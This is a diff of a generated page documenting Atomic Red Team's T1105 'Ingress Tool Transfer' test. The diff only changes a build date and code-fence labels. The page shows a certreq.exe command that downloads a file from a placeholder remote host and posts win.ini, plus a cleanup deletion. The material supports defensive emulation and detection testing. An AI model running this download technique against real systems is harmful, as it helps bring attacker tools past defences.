@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1105"
 attack_technique_name: "Ingress Tool Transfer"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "6fdaae87-c05b-42f8-842e-991a74e8376b"
@@ -56,13 +56,13 @@ Use certreq to download a file from the web
 
 ### Command
 
-```commandprompt
+```cmd
 certreq.exe -Post -config #{remote_file} c:\windows\win.ini #{local_path}
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 del #{local_path} >nul 2>&1
 ```
 
